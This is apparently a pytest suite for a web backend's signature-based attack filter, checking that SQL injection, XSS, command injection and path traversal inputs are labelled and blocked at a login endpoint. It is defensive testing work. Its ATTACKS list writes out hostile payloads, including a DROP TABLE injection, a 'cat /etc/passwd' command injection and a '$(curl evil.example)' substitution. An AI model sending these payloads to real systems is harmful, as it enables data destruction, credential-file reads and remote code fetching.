"""Tests for the local signature pre-filter and its use in the request path."""
import time
import urllib.parse as up

import pytest

from backend.signatures import detect_signature, normalize

ATTACKS = [
    ("' OR 1=1--", "SQL_INJECTION"),
    ("admin' or 'a'='a", "SQL_INJECTION"),
    ("1 UNION SELECT username, password FROM users", "SQL_INJECTION"),
    ("1 UNION/**/SELECT 1,2", "SQL_INJECTION"),
    ("x'; DROP TABLE users;--", "SQL_INJECTION"),
    ("1 AND SLEEP(5)", "SQL_INJECTION"),
    ("<script>alert(1)</script>", "XSS_ATTACK"),
    ("<img src=x onerror=alert(1)>", "XSS_ATTACK"),
    ("javascript:alert(1)", "XSS_ATTACK"),
    ("name; cat /etc/passwd", "COMMAND_INJECTION"),
    ("a && whoami", "COMMAND_INJECTION"),
    ("$(curl evil.example)", "COMMAND_INJECTION"),
    ("../../../../etc/hosts", "PATH_TRAVERSAL"),
    # encoded
    (up.quote("<script>alert(1)</script>"), "XSS_ATTACK"),
    (up.quote(up.quote("' OR 1=1--")), "SQL_INJECTION"),
    ('{"q":"\\u003cscript\\u003ealert(1)"}', "XSS_ATTACK"),
]

BENIGN = [
    '{"username": "alice", "password": "hunter2"}',
    '{"username": "o\'brien", "password": "p@ss"}',
    "Please select a plan from the list",
    "I want to drop by and update my address",
    "Tom & Jerry, rock | roll",
    "price: 5 < 10 and 10 > 5",
    "see ../docs for details",
    "email me at a.b@example.com",
    "",
]


@pytest.mark.parametrize("payload,label", ATTACKS)
def test_attack_is_labelled(payload, label):
    assert detect_signature(payload) == label


@pytest.mark.parametrize("payload", BENIGN)
def test_benign_payload_is_not_flagged(payload):
    assert detect_signature(payload) is None


def test_none_is_safe():
    assert detect_signature(None) is None


def test_malformed_percent_encoding_does_not_raise():
    assert detect_signature("%zz%80%") is None
    assert normalize("%") == "%"


@pytest.mark.parametrize(
    "payload",
    ["a" * 1_000_000, "<" * 100_000, "' or " * 50_000, "%25" * 300_000, "/*" * 200_000, "$(" * 100_000, "`" * 100_000],
)
def test_hostile_input_is_bounded(payload):
    started = time.perf_counter()
    detect_signature(payload)
    assert time.perf_counter() - started < 1.5


def test_signature_hit_skips_redis_and_ai(monkeypatch):
    import backend.ai_guard as guard

    def boom(*a, **k):
        raise AssertionError("AI/Redis must not be called for a signature hit")

    monkeypatch.setattr(guard.redis_client, "get", boom)
    monkeypatch.setattr(guard, "client", type("C", (), {"models": type("M", (), {"generate_content": boom})()})())
    assert guard.analyze_risk_with_ai("' OR 1=1--") == "SQL_INJECTION"


def test_clean_payload_still_goes_to_ai_path(monkeypatch):
    import backend.ai_guard as guard

    monkeypatch.setattr(guard.redis_client, "get", lambda key: "SAFE")
    assert guard.analyze_risk_with_ai('{"username":"alice"}') == "SAFE"


def test_login_endpoint_blocks_attack_even_without_ai_key_or_redis(monkeypatch):
    """Before this change: no key and no Redis meant every payload was SAFE."""
    from fastapi.testclient import TestClient

    import backend.ai_guard as guard
    import backend.main as main

    monkeypatch.setattr(guard, "client", None)
    monkeypatch.setattr(main, "redis_client", None)
    client = TestClient(main.app)

    bad = client.post("/login", json={"username": "admin' OR 1=1--", "password": "x"})
    assert bad.status_code == 403
    assert "SQL_INJECTION" in bad.json()["detail"]

    ok = client.post("/login", json={"username": "alice", "password": "hunter2"})
    assert ok.status_code == 200
